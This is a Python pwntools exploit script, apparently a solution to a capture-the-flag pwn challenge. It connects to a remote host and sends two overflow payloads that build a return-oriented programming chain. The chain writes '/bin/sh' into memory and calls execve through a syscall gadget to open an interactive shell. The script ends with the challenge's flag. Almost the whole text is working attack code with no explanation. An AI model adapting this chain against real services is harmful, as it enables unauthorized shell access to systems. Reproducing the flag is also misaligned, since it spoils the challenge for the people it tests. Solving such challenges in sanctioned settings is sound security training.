#!/usr/bin/env python2

from pwn import *
from Crypto.Util.number import bytes_to_long

# r = process('./chall')
r = remote('34.121.211.139', 3333)

pop_rax = 0x40079a
pop_rdi = 0x40077f
pop_rsi = 0x400791
pop_rdx = 0x400788
syscall = 0x4007a3
ret = 0x40059e
main = 0x4007a8
data = 0x601040
mov_qword = 0x400774 # mov qword ptr [rdi], rax ; ret

size = 8
r.recvuntil('Enter length of input:')
r.sendline(str(size))

pld = '/bin/sh\x00' * 7
pld += p64(pop_rdi)
pld += p64(data)
pld += p64(pop_rax)
pld += p64(bytes_to_long(b'\x00hs/nib/'))
pld += p64(mov_qword)
pld += p64(main)
r.recvuntil('Enter text:\n')
r.sendline(pld)

r.recvuntil('Enter length of input:')
r.sendline(str(size))

pld = '/bin/sh\x00' * 7
pld += p64(pop_rax)
pld += p64(0x3b) # execve
pld += p64(pop_rdi)
pld += p64(data)
pld += p64(pop_rsi)
pld += p64(0)
# pld += p64(pop_rdx)
# pld += p64(0)
pld += p64(syscall)

r.recvuntil('Enter text:\n')
r.sendline(pld)
r.interactive()

"""
ret 0x40084b
read 0x400836
"""

# shaktictf{all0c4_the_m1ghty!}
